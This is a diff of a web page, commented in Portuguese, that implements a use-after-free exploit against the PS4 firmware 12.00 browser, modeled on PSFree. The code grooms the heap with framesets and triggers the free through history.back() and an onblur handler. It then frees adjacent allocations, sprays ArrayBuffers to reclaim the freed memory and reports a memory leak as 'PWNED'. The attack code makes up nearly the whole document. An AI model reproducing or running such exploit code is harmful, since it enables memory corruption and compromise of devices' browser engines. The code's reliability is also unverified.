@@ -2,18 +2,18 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Focus/Blur Exploit 3</title>
+<title>PS4 12.00 - PSFree Native Implementation</title>
 <style>
-    body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
-    button { padding: 15px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; border: 2px solid #0f0; background: #003300; color: #fff; margin-bottom: 10px; }
-    #log { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; white-space: pre-wrap; }
+    body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 14px; }
+    button { padding: 20px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; border: 2px solid #0f0; background: #003300; color: #fff; margin-bottom: 10px; }
+    #log { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; white-space: pre-wrap; background-color: #111; }
     .success { background-color: #fff; color: #000; font-weight: bold; border: 5px solid #0f0; }
 </style>
 </head>
 <body>
-<h2>PS4 12.00 - Precision Trigger (Blur Method)</h2>
-<div id="status">Método: input.onblur (Zero Delay)</div>
-<button onclick="runBlurExploit()">INICIAR ATAQUE PRECISO</button>
+<h2>PS4 12.00 - Neighborhood Freeing Attack</h2>
+<div id="status">Método: Frameset Grooming + Neighbor Freeing</div>
+<button onclick="runNativePSFree()">INICIAR EXPLOIT (LÓGICA NATIVA)</button>
 <div id="log"></div>
 
 <script>
@@ -26,16 +26,35 @@ function log(m) {
 }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-var grooming = [];
-var targetViews = [];
+// =================================================================
+// PARÂMETROS DO PSFREE.MJS
+// =================================================================
+// Para FW >= 9.00, ssv_len é 0x50 (80 bytes)
+const SSV_LEN = 0x50; 
 
-async function runBlurExploit() {
+// Cálculo do payload do frameset para ocupar SSV_LEN no fastMalloc
+// Fórmula: ssv_len / 8 - 2.  Para 80 bytes: 10 - 2 = 8 vírgulas.
+const ROWS_PAYLOAD = ",".repeat(SSV_LEN / 8 - 2);
+
+const NUM_FSETS = 0x180; // 384 framesets iniciais
+const NUM_SPACES = 0x40; // 64 framesets de espaçamento
+const NUM_ADJS = 8;      // Vizinhos a liberar (4 antes, 4 depois)
+const NUM_REUSES = 0x300;// Quantos buffers de spray tentar
+
+var fsets = []; // Armazena os framesets de grooming
+var sprayed_views = []; // Armazena os buffers do spray final
+
+// =================================================================
+// LÓGICA DE EXPLOIT
+// =================================================================
+
+async function runNativePSFree() {
     logEl.textContent = "";
-    grooming = [];
-    targetViews = [];
+    fsets = [];
+    sprayed_views = [];
     statusEl.textContent = "Preparando...";
 
-    // 1. SETUP DO DOM PARA O TRUQUE DE FOCO
+    // 1. SETUP DO DOM
     const input = document.createElement("input");
     input.id = "trigger";
     document.body.appendChild(input);
@@ -44,90 +63,142 @@ async function runBlurExploit() {
     anchor.id = "anchor";
     document.body.appendChild(anchor);
 
-    // 2. GROOMING (Preparação do Heap)
-    // Enchemos a memória com buffers de 64 bytes (seu tamanho vencedor)
-    log("1. Enchendo memória (Grooming 64 bytes)...");
-    for(let i=0; i<3000; i++) {
-        let buf = new ArrayBuffer(64);
-        let view = new Uint32Array(buf);
-        view.fill(0x41414141); // AAAA
-        grooming.push({buf: buf, view: view});
+    log(`1. Configuração: Alvo=${SSV_LEN} bytes | Payload='${ROWS_PAYLOAD}'`);
+
+    // 2. HEAP GROOMING (PREPARAÇÃO)
+    // Criamos o "Tapete" de framesets onde o UAF vai cair
+    log("2. Criando tapete de Framesets (Grooming)...");
+    
+    // Função auxiliar para criar lote de framesets
+    function alloc_fs(count) {
+        for(let i=0; i<count; i++) {
+            let f = document.createElement("frameset");
+            f.rows = ROWS_PAYLOAD;
+            f.cols = ROWS_PAYLOAD; // Ocupa memória extra para garantir estabilidade
+            fsets.push(f);
+        }
     }
 
-    // Criar buracos (Swiss Cheese)
-    for(let i=0; i<grooming.length; i+=5) {
-        grooming[i] = null;
-    }
+    // A. Estado Inicial
+    history.replaceState("state0", "");
+    
+    // B. Aloca a primeira massa de framesets (384)
+    alloc_fs(NUM_FSETS);
+    
+    // C. Empurra o Estado 1 (O ALVO UAF)
+    // Ele deve cair logo após os framesets, adjacente a eles na memória
+    log("   -> Alocando alvo UAF (state1)...");
+    const target_idx = fsets.length; // Guardamos onde o alvo deve estar (teoricamente)
+    history.pushState("state1", "", "#target");
+    
+    // D. Aloca espaçadores (64)
+    // Isso coloca framesets DEPOIS do alvo, completando o sanduíche
+    alloc_fs(NUM_SPACES);
+    
+    // E. Estado dummy (padding)
+    history.pushState("state1_dummy", "", "#dummy");
+    
+    // F. Mais espaçadores
+    alloc_fs(NUM_SPACES);
+    
+    // G. Estado Final (onde estamos agora)
+    history.pushState("state2", "");
 
-    // 3. O GATILHO MÁGICO (ONBLUR)
+    log(`3. Grooming completo. Total Framesets: ${fsets.length}`);
+    log("   Aguardando estabilização do DOM...");
+
+    // Espera o documento estar pronto (Crucial no psfree)
+    if (document.readyState !== "complete") {
+        await new Promise(r => window.onload = r);
+    }
+    
+    // 3. GATILHO ONBLUR (A MÁGICA)
     let triggered = false;
     
     input.onblur = function() {
         triggered = true;
-        log(">>> EVENTO BLUR DISPARADO (Sincronia Perfeita) <<<");
+        log(">>> [EVENTO] ONBLUR DISPARADO <<<");
         
-        // SPRAY IMEDIATO
-        // Isso roda na mesma thread do free(), sem delay
-        for(let i=0; i<500; i++) {
-            let buf = new ArrayBuffer(80);
-            let view = new Uint32Array(buf);
+        // --- PASSO CRÍTICO 1: LIBERAR VIZINHOS ---
+        // Isso esvazia a "SmallLine" do bmalloc para forçar a reutilização
+        log("   -> Liberando vizinhos...");
+        
+        // O alvo está teoricamente no índice 'target_idx' relativo aos framesets.
+        // Liberamos alguns antes e alguns depois.
+        // Como o history.pushState não entra no array 'fsets', usamos o final do primeiro bloco.
+        // O alvo está ENTRE fsets[NUM_FSETS-1] e fsets[NUM_FSETS].
+        // Vamos liberar o final do primeiro bloco e o começo do segundo bloco.
+        
+        let start_free = NUM_FSETS - (NUM_ADJS / 2);
+        let end_free = NUM_FSETS + (NUM_ADJS / 2);
+        
+        for(let i = start_free; i < end_free; i++) {
+            if(fsets[i]) {
+                fsets[i].rows = "";
+                fsets[i].cols = "";
+            }
+        }
+
+        // --- PASSO CRÍTICO 2: SPRAY IMEDIATO ---
+        // Sprayamos ArrayBuffers de 80 bytes (SSV_LEN)
+        // O primeiro byte deve ser 0x41 ('A') para detecção
+        log(`   -> Spraying ${NUM_REUSES} buffers de ${SSV_LEN} bytes...`);
+        
+        for(let i=0; i < NUM_REUSES; i++) {
+            let buf = new ArrayBuffer(SSV_LEN);
+            let view = new Uint8Array(buf);
             
-            // Padrão 'BBBB' (0x42424242)
-            view.fill(0x42424242); 
+            view[0] = 0x41; // Marcador 'A'
+            view[1] = 0x41; // Marcador 'A'
+            // Preenche o resto com 0 para ser limpo
             
-            // Guardamos a view para checar se ela foi corrompida depois
-            targetViews.push(view);
+            sprayed_views.push(view);
         }
     };
 
-    log("2. Configurando armadilha de histórico...");
-    
-    // Configura histórico para permitir o 'back'
-    history.pushState("state1", "", "#START");
-    history.pushState("state2", "", "#END");
-
-    // FOCA NO INPUT
-    log("3. Focando input...");
+    // 4. DISPARO
+    log("4. Focando input...");
     input.focus();
-    await sleep(200); // Garante que o foco foi registrado
-
-    // DISPARA O UAF
-    log("4. Executando history.back()...");
-    history.back(); 
-    // O 'back' vai tirar o foco do input -> dispara onblur -> executa spray
+    await sleep(200);
+    
+    log("5. Executando history.back()...");
+    history.back();
 
     await sleep(500);
 
-    // 5. VERIFICAÇÃO
     if(!triggered) {
-        log("ERRO: O evento onblur não disparou. Clique na página e tente de novo.");
+        log("ERRO: Blur não disparou. Tente clicar na tela.");
         return;
     }
 
-    log("5. Analisando memória por corrupção...");
+    // 5. CHECAGEM (LEAK CHECK)
+    log("6. Verificando buffers...");
     let success = false;
     
-    // Checamos nossos buffers 'BBBB'
-    // Se o UAF funcionou, o navegador escreveu algo (ponteiro) em cima do nosso 'BBBB'
-    for(let i=0; i<targetViews.length; i++) {
-        let v = targetViews[i];
-        if(v[0] !== 0x42424242) {
+    for(let i=0; i < sprayed_views.length; i++) {
+        let view = sprayed_views[i];
+        
+        // Se o primeiro byte NÃO for 0x41, o WebKit escreveu algo em cima!
+        if(view[0] !== 0x41) {
             success = true;
-            let val = "0x" + v[0].toString(16).padStart(8,'0');
             log(`!!! LEAK DETECTADO NO BUFFER ${i} !!!`);
-            log(`Valor lido: ${val}`);
+            
+            // Dump dos primeiros 16 bytes
+            let dump = "";
+            for(let k=0; k<16; k++) dump += view[k].toString(16).padStart(2,'0') + " ";
+            
+            log(`DUMP: ${dump}`);
             statusEl.className = "success";
-            statusEl.textContent = `LEAK CONFIRMADO: ${val}`;
+            statusEl.textContent = `PWNED! LEAK: ${dump}`;
             break;
         }
     }
 
     if(!success) {
-        log("Falha: Buffers intactos. Tente ajustar o tamanho (ex: 80 bytes).");
-        log("Dica: Se falhar 3x com 64 bytes, mude a linha 'new ArrayBuffer(64)' para 80.");
+        log("Falha: Buffers intactos. O vizinho não foi liberado corretamente ou o alinhamento falhou.");
     }
-
-    // Limpeza
+    
+    // Cleanup
     input.remove();
     anchor.remove();
 }
